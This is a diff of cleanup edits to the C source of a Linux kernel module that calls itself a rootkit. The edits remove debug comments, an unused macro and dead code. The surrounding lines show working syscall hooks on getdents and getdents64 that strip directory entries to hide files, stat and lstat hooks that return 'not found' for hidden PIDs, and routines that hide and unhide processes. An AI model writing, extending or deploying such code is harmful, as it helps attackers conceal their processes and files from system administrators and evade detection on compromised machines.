@@ -69,15 +69,6 @@ unsigned long *syscall_table = NULL;
 	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
 		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK(n_args, __VA_ARGS__));                        \
 	}
-
-#define hook_define_ret(n_args, ret_type, syscall_name, ...)                                           \
-	asmlinkage ret_type sys_##syscall_name##_do_hook(DECL_DO_HOOK_RET(n_args, ret_type, __VA_ARGS__)); \
-	asmlinkage ret_type (*sys_##syscall_name##_orig)(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
-	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
-		ret_type ret = sys_##syscall_name##_orig(ARGS_ORIG(n_args, __VA_ARGS__));                      \
-		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK_RET(n_args, __VA_ARGS__));                    \
-	}
-
 // END HOOK DEFINING MACROS -----------------------------------------
 
 hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
@@ -122,7 +113,6 @@ asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user
 		}
 
 		if (del){
-			//printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
 			// Copies the rest of the buffer to the position of the current entry
 			deleted_size = currnt->d_reclen;
 			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
@@ -131,11 +121,10 @@ asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user
 			buff_offset += currnt->d_reclen;
 
 	}
-	//printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
 	return ret;
 }
 
-// COPY PASTE: YOU CAN DO IT BETTER B****
+// COPY PASTE: YOU CAN DO IT BETTER
 asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, const struct pt_regs* regs) {
 	int buff_offset, deleted_size;
 	struct linux_dirent64* currnt;
@@ -178,12 +167,11 @@ asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __
 			buff_offset += currnt->d_reclen;
 
 	}
-	//printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
 	return ret;
 }
 
 const char* my_basename(const char __user* pathname){
-	// proc/ /proc proc proc/pepe /proc/ TESTING
+	// Examples: proc/ /proc proc proc/pepe /proc/
 	int len = strlen(pathname);
 	const char __user* basename = pathname;
 	for (int i = 0; i < len-1; i++)
@@ -197,20 +185,6 @@ const char* my_basename(const char __user* pathname){
 		result[len-1] = '\x00';
 
 	return result;
-
-	/*
-	char* tmp = kmalloc(len+1, GFP_KERNEL);
-	memcpy(tmp, pathname, len+1);
-	char* last_barra = strrchr(tmp, '/');
-	if (last_barra == NULL)
-		return tmp;
-	if (last_barra == tmp+len-1){ //last pos
-		tmp[len-1] = '\x00';
-		last_barra = strrchr(tmp, '/');
-		if (last_barra == NULL)
-			return tmp;
-	}
-	return last_barra+1;*/
 }
 
 int check_pid_in_pathname(const char __user *pathname, const char* syscall_caller){
@@ -249,7 +223,6 @@ asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kerne
 }
 
 asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
-	//printk(KERN_INFO "ROOTKIT: hello from stat\n");
 	if (check_pid_in_pathname(pathname, "lstat") == -1) return -ENOENT;
 	return sys_lstat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
 }
@@ -382,13 +355,6 @@ int hide_pid(int pid){
 	list_add(&node->list, &list_pids);
 	printk(KERN_INFO "ROOTKIT: Hidden PID %d\n", pid);
 	return 0;
-	/*char pid_s[8]; //PID_MAX_LIMIT can be up to 2^22 = 4194304
-	if (pid > PID_MAX_LIMIT){
-		printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d larger than PID_MAX_LIMIT\n", pid);
-		return -1;
-	}
-	snprintf(pid_s, sizeof(pid_s), "%d", pid);
-	return hide_file(pid_s);*/
 }
 
 int unhide_pid(int pid){
@@ -402,7 +368,4 @@ int unhide_pid(int pid){
 	}
 	printk(KERN_INFO "ROOTKIT: ERROR trying to unhide not found pid %d\n", pid);
 	return -1;
-	/*char pid_s[8];
-	snprintf(pid_s, sizeof(pid_s), "%d", pid);
-	return unhide_file(pid_s);*/
 }
